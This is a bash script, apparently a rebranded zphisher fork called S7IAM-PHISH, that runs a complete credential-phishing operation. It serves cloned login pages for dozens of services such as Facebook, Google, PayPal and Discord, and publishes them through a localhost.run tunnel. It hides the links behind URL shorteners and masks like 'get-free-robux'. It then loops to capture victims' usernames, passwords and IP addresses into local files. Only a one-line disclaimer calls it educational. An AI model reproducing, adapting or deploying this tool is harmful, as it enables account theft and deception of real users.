#!/bin/bash

## Version
__version__="1.0"

## DEFAULT HOST & PORT
HOST='127.0.0.1'
PORT='8080'

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

if [[ ! -d ".server" ]]; then
    mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
    mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
    rm -rf ".server/www"
    mkdir -p ".server/www"
else
    mkdir -p ".server/www"
fi

## Remove logfile
if [[ -e ".server/.loclx" ]]; then
    rm -rf ".server/.loclx"
fi

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
    tput sgr0   # reset attributes
    tput op     # reset color
    return
}

## Kill already running process
kill_pid() {
    check_PID="php ssh"
    for process in ${check_PID}; do
        if [[ $(pidof ${process}) ]]; then
            killall ${process} > /dev/null 2>&1
        fi
    done
}

## Check SSH Key
check_ssh_key() {
    if [[ ! -f "$HOME/.ssh/id_rsa" ]]; then
        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Generating SSH key..."
        ssh-keygen -t rsa -b 4096 -f "$HOME/.ssh/id_rsa" -N "" > /dev/null 2>&1
        echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} SSH key generated successfully."
    else
        echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} SSH key already exists."
    fi
}

## Check Internet Status
check_status() {
    echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
    timeout 3s curl -fIs "https://api.github.com" > /dev/null
    [ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" || echo -e "${RED}Offline${WHITE}"
}

## Dependencies
dependencies() {
    echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."

    if [[ ! $(command -v figlet) ]]; then
        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}figlet${CYAN}"${WHITE}
        if [[ $(command -v pkg) ]]; then
            pkg install figlet -y
        elif [[ $(command -v apt) ]]; then
            sudo apt install figlet -y
        elif [[ $(command -v apt-get) ]]; then
            sudo apt-get install figlet -y
        elif [[ $(command -v pacman) ]]; then
            sudo pacman -S figlet --noconfirm
        elif [[ $(command -v dnf) ]]; then
            sudo dnf -y install figlet
        elif [[ $(command -v yum) ]]; then
            sudo yum -y install figlet
        else
            echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install figlet manually."
            { reset_color; exit 1; }
        fi
    fi

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ ! $(command -v proot) ]]; then
            echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi

        if [[ ! $(command -v tput) ]]; then
            echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
            pkg install ncurses-utils -y
        fi
    fi

    if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) && $(command -v ssh) ]]; then
        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
    else
        pkgs=(php curl unzip openssh)
        for pkg in "${pkgs[@]}"; do
            type -p "$pkg" &>/dev/null || {
                echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
                if [[ $(command -v pkg) ]]; then
                    pkg install "$pkg" -y
                elif [[ $(command -v apt) ]]; then
                    sudo apt install "$pkg" -y
                elif [[ $(command -v apt-get) ]]; then
                    sudo apt-get install "$pkg" -y
                elif [[ $(command -v pacman) ]]; then
                    sudo pacman -S "$pkg" --noconfirm
                elif [[ $(command -v dnf) ]]; then
                    sudo dnf -y install "$pkg"
                elif [[ $(command -v yum) ]]; then
                    sudo yum -y install "$pkg"
                else
                    echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
                    { reset_color; exit 1; }
                fi
            }
        done
    fi
}

## Banner
banner() {
    if [[ $(command -v figlet) ]]; then
        echo -e "${BLUE}"
        figlet -f standard "S7IAM-PHISH"
        echo -e "${BLUE}                                ${WHITE}${__version__}\n"
        echo -e "${GREEN}[${WHITE}-${GREEN}]${CYAN} lnwper-Thanwisut (lnwper)${WHITE}"
    else
        cat <<- EOF
        ${BLUE}
        ${BLUE}     _____ ______ _____          __  __        _____  _    _ _____  _____ _    _
        ${BLUE}    / ____|____  |_   _|   /\   |  \/  |      |  __ \| |  | |_   _|/ ____| |  | |
        ${BLUE}   | (___     / /  | |    /  \  | \  / |______| |__) | |__| | | | | (___ | |__| |
        ${BLUE}    \___ \   / /   | |   / /\ \ | |\/| |______|  ___/|  __  | | |  \___ \|  __  |
        ${BLUE}    ____) | / /   _| |_ / ____ \| |  | |      | |    | |  | |_| |_ ____) | |  | |
        ${BLUE}   |_____/ /_/   |_____/_/    \_\_|  |_|      |_|    |_|  |_|_____|_____/|_|  |_|
        ${BLUE}                                ${WHITE}${__version__}

        ${GREEN}[${WHITE}-${GREEN}]${CYAN} lnwper-Thanwisut (lnwper)${WHITE}
EOF
    fi
}

## Small Banner
banner_small() {
    if [[ $(command -v figlet) ]]; then
        echo -e "${BLUE}"
        figlet -f small "S7IAM"
        echo -e "${BLUE}                                ${WHITE}${__version__}"
    else
       echo -e "${YELLOW}[!] figlet not found. Installing...${NC}"
        if [[ $(command -v pkg) ]]; then
            pkg install -y figlet
        elif [[ $(command -v apt) ]]; then
            sudo apt install -y figlet
        else
            echo -e "${RED}[!] Cannot install figlet: no known package manager found.${NC}"
            return 1
        fi
        echo -e "${GREEN}[✓] figlet installed. Showing banner...${NC}"
        banner_small  # เรียกซ้ำหลังติดตั้ง
    fi
}

## Setup website and start php server
setup_site() {
    if [[ -z "$website" || ! -d ".sites/$website" ]]; then
        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error: Website not specified or .sites/$website does not exist."
        { reset_color; exit 1; }
    fi
    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server...${WHITE}"
    cp -rf .sites/"$website"/* .server/www
    cp -f .sites/ip.php .server/www/
    echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server...${WHITE}"
    cd .server/www && php -S "$HOST:$PORT" > /dev/null 2>&1 &
    if [[ $? -ne 0 ]]; then
        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to start PHP server."
        { reset_color; exit 1; }
    fi
}

## Get IP address
capture_ip() {
    if [[ ! -f ".server/www/ip.txt" ]]; then
        echo -e "\n${RED}[${WHITE}!${RED}]${RED} No IP data found."
        return
    fi
    IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
    IFS=$'\n'
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
    echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
    cat .server/www/ip.txt >> auth/ip.txt
}

## Get credentials
capture_creds() {
    if [[ ! -f ".server/www/usernames.txt" ]]; then
        echo -e "\n${RED}[${WHITE}!${RED}]${RED} No login data found."
        return
    fi
    ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
    PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
    IFS=$'\n'
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
    cat .server/www/usernames.txt >> auth/usernames.dat
    echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}

## Print data
capture_data() {
    echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
    while true; do
        if [[ -e ".server/www/ip.txt" ]]; then
            echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
            capture_ip
            rm -rf .server/www/ip.txt
        fi
        sleep 0.75
        if [[ -e ".server/www/usernames.txt" ]]; then
            echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
            capture_creds
            rm -rf .server/www/usernames.txt
        fi
        sleep 0.75
    done
}

## Start localhost
start_localhost() {
    cusport
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
    setup_site
    { sleep 1; clear; banner_small; }
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
    capture_data
}

## Start localhost.run
start_localhost_run() {
    cusport
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
    setup_site
    echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching localhost.run..."
    ssh -R 80:$HOST:$PORT ssh.localhost.run > .server/.loclx 2>&1 &
    sleep 15
    loclx_url=$(grep -o 'https://[-0-9a-z]*\.lhr\.life' ".server/.loclx" 2>/dev/null)
    if [[ -z "$loclx_url" ]]; then
        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to get localhost.run URL."
        { reset_color; exit 1; }
    fi
    custom_url "$loclx_url"
    capture_data
}

## Choose custom port
cusport() {
    echo
    read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
    if [[ ${P_ANS} =~ ^([yY])$ ]]; then
        echo -e "\n"
        read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
        if [[ ! -z "${CU_P}" && "${CU_P}" =~ ^([1-9][0-9]{3})$ && ${CU_P} -ge 1024 && ${CU_P} -le 9999 ]]; then
            PORT=${CU_P}
            echo
        else
            echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
            { sleep 2; clear; banner_small; cusport; }
        fi
    else
        echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
    fi
}

## Tunnel selection
tunnel_menu() {
    { clear; banner_small; }
    cat <<- EOF
        ${RED}[${WHITE}01${RED}]${ORANGE} Localhost
        ${RED}[${WHITE}02${RED}]${ORANGE} Localhost.run
EOF
    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
    case $REPLY in
        1 | 01)
            start_localhost;;
        2 | 02)
            start_localhost_run;;
        *)
            echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
            { sleep 1; tunnel_menu; };;
    esac
}

## Custom Mask URL
custom_mask() {
    { sleep .5; clear; banner_small; echo; }
    read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
    echo
    if [[ ${mask_op,,} == "y" ]]; then
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
        read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url
        if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
            mask=$mask_url
            echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
        else
            echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
        fi
    fi
}

## URL Shortener
site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }

shorten() {
    short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
    if [[ "$1" == *"shrtco.de"* ]]; then
        processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
    else
        processed_url=${short#http*//}
    fi
}

custom_url() {
    url=${1#http*//}
    isgd="https://is.gd/create.php?format=simple&url="
    shortcode="https://api.shrtco.de/v2/shorten?url="
    tinyurl="https://tinyurl.com/api-create.php?url="

    { custom_mask; sleep 1; clear; banner_small; }
    if [[ ${url} =~ [-a-zA-Z0-9.]*(lhr\.life) ]]; then
        if [[ $(site_stat $isgd) == 2* ]]; then
            shorten $isgd "$url"
        elif [[ $(site_stat $shortcode) == 2* ]]; then
            shorten $shortcode "$url"
        else
            shorten $tinyurl "$url"
        fi

        url="https://$url"
        masked_url="$mask@$processed_url"
        processed_url="https://$processed_url"
    else
        url="Unable to generate links. Try after turning on hotspot"
        processed_url="Unable to Short URL"
    fi

    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
    [[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
}

## Facebook
site_facebook() {
    cat <<- EOF
        ${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
        ${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
        ${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
        ${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page
EOF
    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
    case $REPLY in
        1 | 01)
            website="facebook"
            mask='https://blue-verified-badge-for-facebook-free'
            tunnel_menu;;
        2 | 02)
            website="fb_advanced"
            mask='https://vote-for-the-best-social-media'
            tunnel_menu;;
        3 | 03)
            website="fb_security"
            mask='https://make-your-facebook-secured-and-free-from-hackers'
            tunnel_menu;;
        4 | 04)
            website="fb_messenger"
            mask='https://get-messenger-premium-features-free'
            tunnel_menu;;
        *)
            echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
            { sleep 1; clear; banner_small; site_facebook; };;
    esac
}

## Instagram
site_instagram() {
    cat <<- EOF
        ${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
        ${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
        ${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
        ${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
EOF
    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
    case $REPLY in
        1 | 01)
            website="instagram"
            mask='https://get-unlimited-followers-for-instagram'
            tunnel_menu;;
        2 | 02)
            website="ig_followers"
            mask='https://get-unlimited-followers-for-instagram'
            tunnel_menu;;
        3 | 03)
            website="insta_followers"
            mask='https://get-1000-followers-for-instagram'
            tunnel_menu;;
        4 | 04)
            website="ig_verify"
            mask='https://blue-badge-verify-for-instagram-free'
            tunnel_menu;;
        *)
            echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
            { sleep 1; clear; banner_small; site_instagram; };;
    esac
}

## Gmail/Google
site_gmail() {
    cat <<- EOF
        ${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
        ${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
        ${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll
EOF
    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
    case $REPLY in
        1 | 01)
            website="google"
            mask='https://get-unlimited-google-drive-free'
            tunnel_menu;;
        2 | 02)
            website="google_new"
            mask='https://get-unlimited-google-drive-free'
            tunnel_menu;;
        3 | 03)
            website="google_poll"
            mask='https://vote-for-the-best-social-media'
            tunnel_menu;;
        *)
            echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
            { sleep 1; clear; banner_small; site_gmail; };;
    esac
}

## Vk
site_vk() {
    cat <<- EOF
        ${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
        ${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
EOF
    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
    case $REPLY in
        1 | 01)
            website="vk"
            mask='https://vk-premium-real-method-2020'
            tunnel_menu;;
        2 | 02)
            website="vk_poll"
            mask='https://vote-for-the-best-social-media'
            tunnel_menu;;
        *)
            echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
            { sleep 1; clear; banner_small; site_vk; };;
    esac
}

## About
about() {
    { clear; banner; echo; }
    cat <<- EOF
        ${GREEN} Author   ${RED}:  ${ORANGE}Thanwisut
        ${GREEN} Github   ${RED}:  ${CYAN}https://github.com/Thanwisut
        ${GREEN} Version  ${RED}:  ${ORANGE}${__version__}

        ${WHITE} ${REDBG}Warning:${RESETBG}
        ${CYAN}  This Tool is made for educational purpose
          only ${RED}!${WHITE}${CYAN} Author will not be responsible for
          any misuse of this toolkit ${RED}!${WHITE}

        ${WHITE} ${CYANBG}This is updated of zphisher but better:${RESETBG}
        ${GREEN}  Made by Thanwisut

        ${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
EOF
    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
    case $REPLY in
        99)
            msg_exit;;
        0 | 00)
            echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
            { sleep 1; main_menu; };;
        *)
            echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
            { sleep 1; about; };;
    esac
}

## Exit message
msg_exit() {
    { clear; banner; echo; }
    echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
    { reset_color; exit 0; }
}

## Menu
main_menu() {
    { clear; banner; echo; }
    cat <<- EOF
        ${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}

        ${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
        ${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
        ${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
        ${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox
        ${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo
        ${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
        ${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex
        ${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
        ${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
        ${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
        ${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
        ${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox

        ${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
EOF
    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
    case $REPLY in
        1 | 01)
            site_facebook;;
        2 | 02)
            site_instagram;;
        3 | 03)
            site_gmail;;
        4 | 04)
            website="microsoft"
            mask='https://unlimited-onedrive-space-for-free'
            tunnel_menu;;
        5 | 05)
            website="netflix"
            mask='https://upgrade-your-netflix-plan-free'
            tunnel_menu;;
        6 | 06)
            website="paypal"
            mask='https://get-500-usd-free-to-your-acount'
            tunnel_menu;;
        7 | 07)
            website="steam"
            mask='https://steam-500-usd-gift-card-free'
            tunnel_menu;;
        8 | 08)
            website="twitter"
            mask='https://get-blue-badge-on-twitter-free'
            tunnel_menu;;
        9 | 09)
            website="playstation"
            mask='https://playstation-500-usd-gift-card-free'
            tunnel_menu;;
        10)
            website="tiktok"
            mask='https://tiktok-free-liker'
            tunnel_menu;;
        11)
            website="twitch"
            mask='https://unlimited-twitch-tv-user-for-free'
            tunnel_menu;;
        12)
            website="pinterest"
            mask='https://get-a-premium-plan-for-pinterest-free'
            tunnel_menu;;
        13)
            website="snapchat"
            mask='https://view-locked-snapchat-accounts-secretly'
            tunnel_menu;;
        14)
            website="linkedin"
            mask='https://get-a-premium-plan-for-linkedin-free'
            tunnel_menu;;
        16)
            website="quora"
            mask='https://quora-premium-for-free'
            tunnel_menu;;
        17)
            website="protonmail"
            mask='https://protonmail-pro-basics-for-free'
            tunnel_menu;;
        18)
            website="spotify"
            mask='https://convert-your-account-to-spotify-premium'
            tunnel_menu;;
        19)
            website="reddit"
            mask='https://reddit-official-verified-member-badge'
            tunnel_menu;;
        20)
            website="adobe"
            mask='https://get-adobe-lifetime-pro-membership-free'
            tunnel_menu;;
        21)
            website="deviantart"
            mask='https://get-500-usd-free-to-your-acount'
            tunnel_menu;;
        22)
            website="badoo"
            mask='https://get-500-usd-free-to-your-acount'
            tunnel_menu;;
        23)
            website="origin"
            mask='https://get-500-usd-free-to-your-acount'
            tunnel_menu;;
        24)
            website="dropbox"
            mask='https://get-1TB-cloud-storage-free'
            tunnel_menu;;
        25)
            website="yahoo"
            mask='https://grab-mail-from-anyother-yahoo-account-free'
            tunnel_menu;;
        26)
            website="wordpress"
            mask='https://unlimited-wordpress-traffic-free'
            tunnel_menu;;
        27)
            website="yandex"
            mask='https://grab-mail-from-anyother-yandex-account-free'
            tunnel_menu;;
        28)
            website="stackoverflow"
            mask='https://get-stackoverflow-lifetime-pro-membership-free'
            tunnel_menu;;
        29)
            site_vk;;
        30)
            website="xbox"
            mask='https://get-500-usd-free-to-your-acount'
            tunnel_menu;;
        31)
            website="mediafire"
            mask='https://get-1TB-on-mediafire-free'
            tunnel_menu;;
        32)
            website="gitlab"
            mask='https://get-1k-followers-on-gitlab-free'
            tunnel_menu;;
        33)
            website="github"
            mask='https://get-1k-followers-on-github-free'
            tunnel_menu;;
        34)
            website="discord"
            mask='https://get-discord-nitro-free'
            tunnel_menu;;
        35)
            website="roblox"
            mask='https://get-free-robux'
            tunnel_menu;;
        99)
            about;;
        0 | 00)
            msg_exit;;
        *)
            echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
            { sleep 1; main_menu; };;
    esac
}

## Main
kill_pid
dependencies
check_ssh_key
check_status
main_menu
